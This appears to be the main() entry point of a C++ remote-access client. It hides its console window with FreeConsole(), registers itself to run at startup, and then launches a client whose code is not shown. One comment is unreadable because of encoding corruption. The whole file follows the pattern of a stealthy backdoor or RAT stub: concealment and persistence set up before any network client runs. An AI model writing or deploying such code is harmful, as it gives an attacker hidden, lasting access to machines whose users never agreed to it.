#include "client.h"
#include "utils.h"


int main()
{
    FreeConsole(); // �������� ��������� ����� .exe ������ �� � VS

    // Add AutoRun
    Utils utils;
    if (!utils.AddToStartup())
        return -1;


    // Creat Client
    Client client;
    client.ClientStart();

    system("pause");
    return 0;
}
